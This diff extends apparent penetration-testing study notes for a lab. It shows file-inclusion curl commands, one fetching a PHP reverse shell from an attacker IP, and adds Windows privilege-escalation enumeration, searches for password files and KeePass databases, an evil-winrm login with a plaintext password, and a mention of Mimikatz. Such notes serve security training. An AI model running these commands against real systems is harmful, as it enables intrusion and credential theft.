@@ -82,3 +82,52 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64
 RFI 
 curl "http://mountaindesserts.local/meteor/index.php?page=http://192.168.45.236:8080/pentestmonkeyphprev.php
 
+
+---------------------------------
+windows priv esc
+The SID string consists of different parts, delimited by "-", and represented by the placeholders "S", "R", "X", and "Y" in the following listing. This representation is the fundamental structure of a SID.
+The first part is a literal "S", which indicates that the string is a SID.
+
+"R" stands for revision and is always set to "1", since the overall SID structure continues to be on its initial version.
+
+"X" determines the identifier authority. This is the authority that issues the SID. For example, "5" is the most common value for the identifier authority. It specifies NT Authority and is used for local or domain users and groups.
+
+"Y" represents the sub authorities of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and relative identifier (RID). The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID determines principals such as users or groups.
+
+List of Well known SIDs on local machines
+----------------------
+S-1-0-0                       Nobody        
+S-1-1-0	                      Everybody
+S-1-5-11                      Authenticated Users
+S-1-5-18                      Local System
+S-1-5-domainidentifier-500    Administrator
+
+When first access granted to target system collect following informations as bare minimum
+- Username and hostname
+- Group memberships of the current user  --->whoami /groups -- Get-LocalUser 
+- Existing users and groups  -----> Get-LocalGroup ---Get-LocalGroupMember adminteam
+- Operating system, version and architecture ---->systeminfo
+- Network information ----->  ipconfig /all -- route print -- netstat -ano
+- Installed applications -------> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname -- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname -- to see details remove pipe select displayname -- Get-Process NonStandardProcess | Format-List Path
+- Running processes ------> Get-Process
+However, the listed applications from Listing 15 may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
+The output also shows our Netcat connection on port 4444 as well as an RDP connection from 192.168.119.4 on port 3389. This means we are not the only user currently connected to the system. Once we manage to elevate our privileges, we could use Mimikatz and attempt to extract credentials of the user.
+
+if keepass exist password manager
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+searc txt and ini files
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+search for passwords in different files
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+runas--> runas /user:backupadmin cmd
+
+convertbase64 windows powershell
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmxhaGJsYWg="))
+
+Evil-WinRm
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+Powershell History
+Get-History
+if empty try this 
+(Get-PSReadlineOption).HistorySavePath
+and cat this. 
